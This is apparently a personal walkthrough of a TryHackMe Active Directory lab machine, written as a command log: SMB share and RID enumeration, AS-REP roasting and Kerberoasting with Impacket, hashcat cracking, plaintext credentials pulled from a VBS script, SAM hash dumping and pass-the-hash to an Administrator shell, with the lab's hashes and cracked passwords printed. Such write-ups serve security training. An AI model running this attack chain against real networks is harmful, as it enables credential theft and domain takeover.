ipaddr `10.10.65.51`

# date 21-04-24 || Rohit Tiwari

# Nmap scan 

```bash
┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/Vulnetroasted_10.10.65.51]
└─$ sudo nmap -sVC -v -A $ip -T4 -oN Vulnet_nmap_scan

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-04-21 10:25:23Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (89%)
Aggressive OS guesses: Microsoft Windows Server 2019 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-04-21T10:25:44
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

```


# first try to enumerate port 139 i.e smb share

```bash

┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/Vulnetroasted_10.10.65.51]
└─$ smbclient -L \\\\$ip                             
Password for [WORKGROUP\dedrknex]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
	VulnNet-Business-Anonymous Disk      VulnNet Business Sharing
	VulnNet-Enterprise-Anonymous Disk      VulnNet Enterprise Sharing
```

## First let's go to Buisness-Anoymous

```bash
┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/Vulnetroasted_10.10.65.51]
└─$ smbclient  \\\\$ip\\VulnNet-Business-Anonymous
Password for [WORKGROUP\dedrknex]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Mar 13 08:16:40 2021
  ..                                  D        0  Sat Mar 13 08:16:40 2021
  Business-Manager.txt                A      758  Fri Mar 12 06:54:34 2021
  Business-Sections.txt               A      654  Fri Mar 12 06:54:34 2021
  Business-Tracking.txt               A      471  Fri Mar 12 06:54:34 2021

		8540159 blocks of size 4096. 4294199 blocks available
smb: \> wget *
wget: command not found

smb: \> mget *
Get file Business-Manager.txt? y
getting file \Business-Manager.txt of size 758 as Business-Manager.txt (0.3 KiloBytes/sec) (average 0.2 KiloBytes/sec)
Get file Business-Sections.txt? y
getting file \Business-Sections.txt of size 654 as Business-Sections.txt (0.5 KiloBytes/sec) (average 0.3 KiloBytes/sec)
Get file Business-Tracking.txt? y
getting file \Business-Tracking.txt of size 471 as Business-Tracking.txt (0.2 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \> dir
  .                                   D        0  Sat Mar 13 08:16:40 2021
  ..                                  D        0  Sat Mar 13 08:16:40 2021
  Business-Manager.txt                A      758  Fri Mar 12 06:54:34 2021
  Business-Sections.txt               A      654  Fri Mar 12 06:54:34 2021
  Business-Tracking.txt               A      471  Fri Mar 12 06:54:34 2021

		8540159 blocks of size 4096. 4294090 blocks available


┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/Vulnetroasted_10.10.65.51]
└─$ cat Business-Manager.txt 
VULNNET BUSINESS
~~~~~~~~~~~~~~~~~~~

Alexa Whitehat is our core business manager. All business-related offers, campaigns, and advertisements should be directed to her. 
We understand that when you’ve got questions, especially when you’re on a tight proposal deadline, you NEED answers. 
Our customer happiness specialists are at the ready, armed with friendly, helpful, timely support by email or online messaging.
We’re here to help, regardless of which you plan you’re on or if you’re just taking us for a test drive.
Our company looks forward to all of the business proposals, we will do our best to evaluate all of your offers properly. 
To contact our core business manager call this number: 1337 0000 7331

~VulnNet Entertainment
~TryHackMe
                                                                                                                     
┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/Vulnetroasted_10.10.65.51]
└─$ cat Business-Sections.txt 
VULNNET BUSINESS
~~~~~~~~~~~~~~~~~~~

Jack Goldenhand is the person you should reach to for any business unrelated proposals.
Managing proposals is a breeze with VulnNet. We save all your case studies, fees, images and team bios all in one central library.
Tag them, search them and drop them into your layout. Proposals just got... dare we say... fun?
No more emailing big PDFs, printing and shipping proposals or faxing back signatures (ugh).
Your client gets a branded, interactive proposal they can sign off electronically. No need for extra software or logins.
Oh, and we tell you as soon as your client opens it.

~VulnNet Entertainment
~TryHackMe
                                                                                                                                      
┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/Vulnetroasted_10.10.65.51]
└─$ cat Business-Tracking.txt 
VULNNET TRACKING
~~~~~~~~~~~~~~~~~~

Keep a pulse on your sales pipeline of your agency. We let you know your close rate,
which sections of your proposals get viewed and for how long,
and all kinds of insight into what goes into your most successful proposals so you can sell smarter.
We keep track of all necessary activities and reach back to you with newly gathered data to discuss the outcome. 
You won't miss anything ever again. 

~VulnNet Entertainment
~TryHackMe
```

# Same goes to enterpise directory found some .txt file but nothing interesting maybe the user name can be used as cred

```bash

┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/Vulnetroasted_10.10.65.51]
└─$ ls
Enterprise-Operations.txt  Enterprise-Safety.txt  Enterprise-Sync.txt
```

## USed crackmapexec to do smb enumerate

```bash
┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/Vulnetroasted_10.10.65.51]
└─$ crackmapexec smb 10.10.65.51 -u 'guest' -p '' --rid-brute
SMB         10.10.65.51     445    WIN-2BO8M1OE1M1  [*] Windows 10.0 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False)
SMB         10.10.65.51     445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\guest: 
SMB         10.10.65.51     445    WIN-2BO8M1OE1M1  [+] Brute forcing RIDs
SMB         10.10.65.51     445    WIN-2BO8M1OE1M1  498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.65.51     445    WIN-2BO8M1OE1M1  500: VULNNET-RST\Administrator (SidTypeUser)
SMB         10.10.65.51     445    WIN-2BO8M1OE1M1  501: VULNNET-RST\Guest (SidTypeUser)
SMB         10.10.65.51     445    WIN-2BO8M1OE1M1  502: VULNNET-RST\krbtgt (SidTypeUser)
SMB         10.10.65.51     445    WIN-2BO8M1OE1M1  512: VULNNET-RST\Domain Admins (SidTypeGroup)
SMB         10.10.65.51     445    WIN-2BO8M1OE1M1  513: VULNNET-RST\Domain Users (SidTypeGroup)
SMB         10.10.65.51     445    WIN-2BO8M1OE1M1  514: VULNNET-RST\Domain Guests (SidTypeGroup)
SMB         10.10.65.51     445    WIN-2BO8M1OE1M1  515: VULNNET-RST\Domain Computers (SidTypeGroup)
SMB         10.10.65.51     445    WIN-2BO8M1OE1M1  516: VULNNET-RST\Domain Controllers (SidTypeGroup)
SMB         10.10.65.51     445    WIN-2BO8M1OE1M1  517: VULNNET-RST\Cert Publishers (SidTypeAlias)
SMB         10.10.65.51     445    WIN-2BO8M1OE1M1  518: VULNNET-RST\Schema Admins (SidTypeGroup)
SMB         10.10.65.51     445    WIN-2BO8M1OE1M1  519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
SMB         10.10.65.51     445    WIN-2BO8M1OE1M1  520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.65.51     445    WIN-2BO8M1OE1M1  521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.65.51     445    WIN-2BO8M1OE1M1  522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.65.51     445    WIN-2BO8M1OE1M1  525: VULNNET-RST\Protected Users (SidTypeGroup)
SMB         10.10.65.51     445    WIN-2BO8M1OE1M1  526: VULNNET-RST\Key Admins (SidTypeGroup)
SMB         10.10.65.51     445    WIN-2BO8M1OE1M1  527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.65.51     445    WIN-2BO8M1OE1M1  553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.65.51     445    WIN-2BO8M1OE1M1  571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.65.51     445    WIN-2BO8M1OE1M1  572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.65.51     445    WIN-2BO8M1OE1M1  1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
SMB         10.10.65.51     445    WIN-2BO8M1OE1M1  1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
SMB         10.10.65.51     445    WIN-2BO8M1OE1M1  1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.65.51     445    WIN-2BO8M1OE1M1  1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
SMB         10.10.65.51     445    WIN-2BO8M1OE1M1  1105: VULNNET-RST\a-whitehat (SidTypeUser)
SMB         10.10.65.51     445    WIN-2BO8M1OE1M1  1109: VULNNET-RST\t-skid (SidTypeUser)
SMB         10.10.65.51     445    WIN-2BO8M1OE1M1  1110: VULNNET-RST\j-goldenhand (SidTypeUser)
SMB         10.10.65.51     445    WIN-2BO8M1OE1M1  1111: VULNNET-RST\j-leet (SidTypeUser)

```

>found some username

```bash     
┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/Vulnetroasted_10.10.65.51]
└─$ awk -F'\' '{print $2}' user.txt | awk -F'(' '{print $1}'
Administrator  
Guest  
krbtgt  
WIN-2BO8M1OE1M1$  
enterprise-core-vn
a-whitehat 
t-skid 
j-goldenhand 
j-leet
```

## Since have a valid username let's go for kerberose which is in port 88

found a ticket on user a-tskid

![](Attachments/Pasted%20image%2020240421163810.png)


```bash

┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/Vulnetroasted_10.10.65.51]
└─$ python3 NPUsers.py  vulnnet-rst.local/ -dc-ip 10.10.65.51  -usersfile user.txt -no-pass -request -outputfile kerberos-users-found
Impacket v0.11.0 - Copyright 2023 Fortra

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User WIN-2BO8M1OE1M1$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User enterprise-core-vn doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:70dc3f3902214c3426264b2ffd459f19$436e0988de7f348376820a800b7afe0baea1209b201de63b24af0c28130d6836a1b02d6a79e45f88c77252a85ec2fba1f9c181cb37bf489ccbbbda0ad74af94eaf773c463306af11de4491f4670745cb300b79761a15ea95fe018fb6d97636e9416354de63ab3aab73d0dc7292c8714ccd2dc20aa962b530948a9c71849b5cc403e3beb8ea631067c60d01eed3430549af7376239deeca344581eccd4b523631cff6c0881c4f4c9373770ddf7f8217f5653ad6dd5dde8535e875f59760fe9a9faea9a1090da9de9ae38f755918def35391ddb7e99f5ec535bd10968f23414f30dd52025b7f394cda857e5f792226daa013d89683b07b
[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax

```

## used hascat to crack this hash

```bash

┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/Vulnetroasted_10.10.65.51]
└─$ hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt  -o cracked.txt 
hashcat (v6.2.6) starting

hash: tj072889*
```

## Got spn

```
┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/Vulnetroasted_10.10.65.51]
└─$ python3 UsersSPN.py  vulnnet-rst.local/t-skid:tj072889* -dc-ip 10.10.65.51  -request
Impacket v0.11.0 - Copyright 2023 Fortra

ServicePrincipalName    Name                MemberOf                                                       PasswordLastSet             LastLogon                   Delegation 
----------------------  ------------------  -------------------------------------------------------------  --------------------------  --------------------------  ----------
CIFS/vulnnet-rst.local  enterprise-core-vn  CN=Remote Management Users,CN=Builtin,DC=vulnnet-rst,DC=local  2021-03-12 01:15:09.913979  2021-03-14 05:11:17.987528             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$vulnnet-rst.local/enterprise-core-vn*$1b2b36c89dc35599bc39b52627a257bf$3cd348cf8d75e517c971e847a2ded0c94628ed5088832a40f289c4152fc24374c9e4fdfdd35c93c9a9966a88bbfa14264a80a3aa7e3550148797c2ba4d56e22e4254d585b79d8794cfaf5f0f69f09abd981345c725120ebf2eb595cb27cf4ec3af4da01ef0145409cb6740fa72a5b34ad4b785f2c21aad7e8cb4f1469864f0f0fd88e40357f83a14c2e71a0c8a7708b84c237cc5916bd248b4afd9ffa1a17d0bbeb172f4c6e54a0569eb13b184cf9629a21a8487bc5755f0b0c8da7b0346e9eb57827c5d4fcd7e56a5b88bf68f79778b25e7a69c926e77c7d86c2524de75a4386e13fde449e0bdbdad5b9a94d065debfeaa603730a4b12c354e4eb395ce5d4a2d944bc19c2ce94536fa0b98c7c1eb363b843a4d49ba63b922b5fb480298ee3e926ca55f01d47d436eb9eba431bb9683a9d61b8b6ae740bb6d3492987e9113fd5822d1a76fc7bbcf28bd1be57baeb04874a258bac159618d938b2d33e28801641e8cc67ee01685c54bbd03641d37ca78fbc74f438aec4b6272f1b39d34afc58b6eca569b67e7fe29f7979f63bae7f94d6bad13a67707cbeecf1b5b216a1775ac85d65a90855bd87cd9c06f0dc56145d435c79d7d8421be684bcdbf77b6e197838d0cacf39f5ae941d34eb57c970466b1d6ce4b5b0984173bb79334440952c1150c9e2ddc18f52661dbaf2821b870abbdc469b7cb61adb541b29720f98759ba70d5e6bb0ee488e45e5a36e6833ff45f6a35df5956eb5590b5f383c308a2058fa610c85f8bf67a8cf168b0a30d9f048dbde7daefcf458335fa060cbc3ccf99c292f391a596be486810431d01cff0a706b052be3a404f18d0e8a53c4a38407836eed35cddcfaad163385e906ead3852ba66a56a3111bb8fc5df62d7c70af6975dd6b01a9b1361ea59c1f181ab62fa9d052dea458dae4a24346d82203683aa98983edde9e9ee98fdea21008a3a42f0f09628170064a3eff0720618e1b9099bc3f472b3017a2d4206a59dee14faacc1fba7185d2696aaec0aa5bb438bfb273ea9b729832e35448cecfb8a9ad8ae19dc0440e38c67ece94d3a30d4c01047fb52273452790a5ec0e86cc566e770f1f8f0925c060e2f8afda2793e1e371d402a68ae89296a9cc6d4517e37f81ea1642bc86b59ab581344b92e2433c878ad22bf277f2544f32aeb4a6e7bddd48212032e794faf0b46d9db84148e19dd097409abf7d09a9aa99ee120f6a6804eee634b7672e76744e0f8ffc0633730ade926552f02f90602e2a462fe6a896b160819f7296eb8e1b29e062dec6d36650dcd1f06ed8f659f2d22117aefa07f887a5232fecba089fbb15b99ec18d6feab48b2bafe35afc94ca727faffae81282d43340e4ec6c8bf76b5505753f2e1a00cad6791590c334



```

now agin used hashcat to crack

```python
──(dedrknex㉿kali)-[~/oscp/Tryhackme/Vulnetroasted_10.10.65.51]
└─$ hashcat -m 13100 hasSpn.txt /usr/share/wordlists/rockyou.txt  -o cracked2.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================

hash : $krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$vulnnet-rst.local/enterprise-core-vn*$1b2b36c89dc35599bc39b52627a257bf$3cd348cf8d75e517c971e847a2ded0c94628ed5088832a40f289c4152fc24374c9e4fdfdd35c93c9a9966a88bbfa14264a80a3aa7e3550148797c2ba4d56e22e4254d585b79d8794cfaf5f0f69f09abd981345c725120ebf2eb595cb27cf4ec3af4da01ef0145409cb6740fa72a5b34ad4b785f2c21aad7e8cb4f1469864f0f0fd88e40357f83a14c2e71a0c8a7708b84c237cc5916bd248b4afd9ffa1a17d0bbeb172f4c6e54a0569eb13b184cf9629a21a8487bc5755f0b0c8da7b0346e9eb57827c5d4fcd7e56a5b88bf68f79778b25e7a69c926e77c7d86c2524de75a4386e13fde449e0bdbdad5b9a94d065debfeaa603730a4b12c354e4eb395ce5d4a2d944bc19c2ce94536fa0b98c7c1eb363b843a4d49ba63b922b5fb480298ee3e926ca55f01d47d436eb9eba431bb9683a9d61b8b6ae740bb6d3492987e9113fd5822d1a76fc7bbcf28bd1be57baeb04874a258bac159618d938b2d33e28801641e8cc67ee01685c54bbd03641d37ca78fbc74f438aec4b6272f1b39d34afc58b6eca569b67e7fe29f7979f63bae7f94d6bad13a67707cbeecf1b5b216a1775ac85d65a90855bd87cd9c06f0dc56145d435c79d7d8421be684bcdbf77b6e197838d0cacf39f5ae941d34eb57c970466b1d6ce4b5b0984173bb79334440952c1150c9e2ddc18f52661dbaf2821b870abbdc469b7cb61adb541b29720f98759ba70d5e6bb0ee488e45e5a36e6833ff45f6a35df5956eb5590b5f383c308a2058fa610c85f8bf67a8cf168b0a30d9f048dbde7daefcf458335fa060cbc3ccf99c292f391a596be486810431d01cff0a706b052be3a404f18d0e8a53c4a38407836eed35cddcfaad163385e906ead3852ba66a56a3111bb8fc5df62d7c70af6975dd6b01a9b1361ea59c1f181ab62fa9d052dea458dae4a24346d82203683aa98983edde9e9ee98fdea21008a3a42f0f09628170064a3eff0720618e1b9099bc3f472b3017a2d4206a59dee14faacc1fba7185d2696aaec0aa5bb438bfb273ea9b729832e35448cecfb8a9ad8ae19dc0440e38c67ece94d3a30d4c01047fb52273452790a5ec0e86cc566e770f1f8f0925c060e2f8afda2793e1e371d402a68ae89296a9cc6d4517e37f81ea1642bc86b59ab581344b92e2433c878ad22bf277f2544f32aeb4a6e7bddd48212032e794faf0b46d9db84148e19dd097409abf7d09a9aa99ee120f6a6804eee634b7672e76744e0f8ffc0633730ade926552f02f90602e2a462fe6a896b160819f7296eb8e1b29e062dec6d36650dcd1f06ed8f659f2d22117aefa07f887a5232fecba089fbb15b99ec18d6feab48b2bafe35afc94ca727faffae81282d43340e4ec6c8bf76b5505753f2e1a00cad6791590c334:ry=ibfkfv,s6h,

```

# Initial foothold 

## Now using evil-winrm to get a shell

```bash

┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/Vulnetroasted_10.10.65.51]
└─$evil-winrm -u enterprise-core-vn -p 'ry=ibfkfv,s6h,' -i 10.10.15.195
*Evil-WinRM* PS C:\Users\enterprise-core-vn\Documents> whomai
```

## Remeber smb shares NETLOGN was inaccessible now let's try to access it

```
┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/Vulnetroasted_10.10.65.51]
└─$ smbclient   \\\\10.10.15.195\\NETLOGON --password ry=ibfkfv,s6h, -U enterprise-core-vn
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Mar 17 04:45:49 2021
  ..                                  D        0  Wed Mar 17 04:45:49 2021
  ResetPassword.vbs                   A     2821  Wed Mar 17 04:48:14 2021

		8540159 blocks of size 4096. 4319471 blocks available
smb: \> get ResetPassword.vbs 
getting file \ResetPassword.vbs of size 2821 as ResetPassword.vbs (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)
smb: \> 

```

>found some cred

![](Attachments/Pasted%20image%2020240422213352.png)

```python
found this credentials from Reset vb scipt

strUserNTName = "a-whitehat"
strPassword = "bNdKVkjv3RR9ht"
```

>Using this credential tried SeceretDump form impacket to get some hashes


like this hash


![](Attachments/Pasted%20image%2020240422214114.png)



Got admin NTML hash

```
┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/Vulnetroasted_10.10.65.51]
└─$ python3 Secretdump.py a-whitehat@10.10.15.195
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xf10a2788aef5f622149a41b2c745f49a
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
```

Got adminsattor shell

```shell
┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/Vulnetroasted_10.10.65.51]
└─$ evil-winrm -i 10.10.15.195 -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

![](Attachments/Pasted%20image%2020240422215435.png)
